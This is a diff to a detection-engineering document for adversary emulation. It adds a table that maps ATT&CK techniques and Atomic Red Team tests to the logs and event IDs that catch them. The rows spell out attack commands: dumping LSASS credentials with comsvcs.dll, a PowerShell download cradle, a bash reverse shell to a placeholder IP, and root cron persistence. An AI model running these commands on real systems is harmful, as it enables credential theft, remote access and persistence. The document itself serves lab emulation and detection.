@@ -52,7 +52,19 @@ All adversarial emulation activities are structured around repeatable, threat-in
 
 ---
 
-## 4. Laboratory Emulation Boundaries
+## 4. Scenario C: Multi-Platform Enterprise Intrusion Mappings (Windows & Linux)
+
+| # | Sub-Technique | ATT&CK ID | Atomic Red Team Test ID | Emulation Command / Technique | Target Data Source | Primary Event IDs | Observable Artifacts |
+|---|---|---|---|---|---|---|---|
+| 1 | OS Credential Dumping: LSASS Memory | **T1003.001** | `T1003.001-2` | MiniDump of LSASS via Comsvcs DLL export: `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 684 C:\temp\lsass.dmp full` | Sysmon | EID 1 | `rundll32.exe` invoking `comsvcs.dll` with `#24` or `MiniDump` |
+| 2 | Spearphishing Attachment / Malicious File | **T1566.001** / **T1204.002** | `T1566.001-2` | Microsoft Office spawning child command interpreter: `winword.exe` spawning `powershell.exe -w hidden` | Sysmon | EID 1 | Parent `winword.exe`/`excel.exe` with child `cmd.exe`/`powershell.exe`/`wscript.exe` |
+| 3 | PowerShell Execution: Download Cradle | **T1059.001** | `T1059.001-2` | WebClient download cradle execution: `powershell.exe -NoP -c "IEX (New-Object Net.WebClient).DownloadString('http://...')"` | Sysmon / PowerShell | EID 1, EID 4104 | CLI matching `.DownloadString`, `.DownloadFile`, `Invoke-WebRequest`, `iwr` with `http://` |
+| 4 | Command and Scripting: Unix Shell | **T1059.004** | `T1059.004-1` | Interactive bash TCP reverse shell: `/bin/bash -i >& /dev/tcp/198.51.100.23/4444 0>&1` | Linux auditd / Sysmon | SYSCALL execve / EID 1 | `/dev/tcp/`, `/dev/udp/`, `pty.spawn`, `socket.socket` redirection syntax |
+| 5 | Scheduled Task/Job: Cron | **T1053.003** | `T1053.003-1` | Root persistence via cron drop: `echo '* * * * * root /tmp/.payload' >> /etc/cron.d/persistence_job` | Linux auditd / Sysmon | SYSCALL execve / EID 1 | Command-line targeting `/etc/cron*`, `/var/spool/cron/`, or `crontab -e` |
+
+---
+
+## 5. Laboratory Emulation Boundaries
 
 As documented in [docs/scope.md](../docs/scope.md):
 - **T1566.001**: Emulation initiates post-delivery execution from user download staging directories.
